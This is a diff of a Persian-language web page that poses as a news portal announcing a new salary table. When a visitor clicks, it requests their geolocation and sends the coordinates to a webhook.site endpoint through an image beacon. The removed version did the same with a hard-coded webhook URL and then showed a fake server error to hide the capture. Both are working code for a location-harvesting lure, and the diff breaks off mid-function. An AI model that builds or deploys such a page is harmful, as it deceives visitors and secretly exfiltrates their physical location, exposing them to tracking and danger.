@@ -1,90 +1,53 @@
-<script>
-const button = document.getElementById("locationBtn");
-const result = document.getElementById("result");
-const WEBHOOK_URL = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پورتال خبری</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; }
+        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; }
+        .btn { background: #e74c3c; color: white; padding: 10px 20px; border-radius: 5px; display: inline-block; margin-top: 10px; text-decoration: none; }
+    </style>
+</head>
+<body>
 
-button.addEventListener("click", getLocation);
+    <div class="card" onclick="getLocation()">
+        <h2>اعلام جدول جدید حقوق ۱۴۰۳</h2>
+        <p>برای مشاهده مبلغ، روی دکمه زیر کلیک کنید</p>
+        <div class="btn">مشاهده مبلغ</div>
+    </div>
 
-function resetUI() {
-    result.textContent = "";
-    result.className = "";
-}
-
-function showError(msg) {
-    result.textContent = msg;
-    result.className = "error-text";
-    button.disabled = false;
-}
-
-function handleGeoError(error) {
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            showError("دسترسی به مکان توسط کاربر رد شد.");
-            break;
-        case error.POSITION_UNAVAILABLE:
-            showError("اطلاعات مکان در دسترس نیست.");
-            break;
-        case error.TIMEOUT:
-            showError("زمان تلاش برای دریافت مکان به پایان رسید.");
-            break;
-        default:
-            showError("یک خطای ناشناخته در مکان‌یابی رخ داد.");
-    }
-}
-
-function getLocation() {
-    resetUI();
-    
-    if (!window.isSecureContext) {
-        showError("خطا: اتصال امن (HTTPS) برای دسترسی به مکان‌یابی الزامی است.");
-        return;
-    }
-    if (!navigator.geolocation) {
-        showError("متأسفانه مرورگر شما از قابلیت مکان‌یابی پشتیبانی نمی‌کند.");
-        return;
-    }
-
-    button.disabled = true;
-    result.textContent = "در حال درخواست دسترسی به موقعیت مکانی...";
-
-    navigator.geolocation.getCurrentPosition(
-        showPosition, 
-        handleGeoError, 
-        {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
+    <script>
+    function getLocation() {
+        // 1. بررسی اینکه آیا مرورگر اصلا قابلیت لوکیشن دارد یا نه
+        if (navigator.geolocation) {
+            alert("در حال درخواست دسترسی... لطفا روی Allow کلیک کنید");
+            
+            navigator.geolocation.getCurrentPosition(sendPosition, showError);
+        } else {
+            alert("مرورگر شما از لوکیشن پشتیبانی نمی‌کند");
         }
-    );
-}
-
-async function showPosition(position) {
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
-
-    if (lat === null || lon === null) {
-        handleGeoError({ code: 0 });
-        return;
     }
 
-    result.textContent = "موقعیت دریافت شد. در حال بررسی وضعیت...";
+    function sendPosition(position) {
+        var lat = position.coords.latitude;
+        var lon = position.coords.longitude;
+        
+        alert("مختصات گرفته شد! در حال ارسال به سرور...");
 
-    try {
-        // Sending data via fetch with no-cors to avoid preflight blocks
-        await fetch(`${WEBHOOK_URL}?lat=${lat}&lon=${lon}`, {
-            method: 'GET',
-            mode: 'no-cors'
-        });
+        // !!! لینک وب‌هوک خودت را اینجا جایگزین کن !!!
+        var webhookUrl = "https://webhook.site/YOUR_ID_HERE"; 
 
-        // Simulating a processing delay for authenticity
-        setTimeout(() => {
-            result.textContent = "خطا در ارتباط با سرور (۵۰۰). لطفاً دقایقی دیگر تلاش کنید.";
-            result.className = "error-text";
-            button.disabled = false;
-        }, 2000);
-
-    } catch (err) {
-        showError("خطا در ارسال اطلاعات به سامانه.");
+        var img = new Image(); 
+        img.src = webhookUrl + "?lat=" + lat + "&lon=" + lon;
+        
+        alert("ارسال موفقیت‌آمیز بود. حالا پنل وب‌هوک را چک کن.");
     }
-}
-</script>
+
+    function showError(error) {
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                alert("خطا: شما اجازه دسترسی به مکان را ندادید (Block کردید)");
+                break;
+            case error.POSITION_UNAVAILABLE:
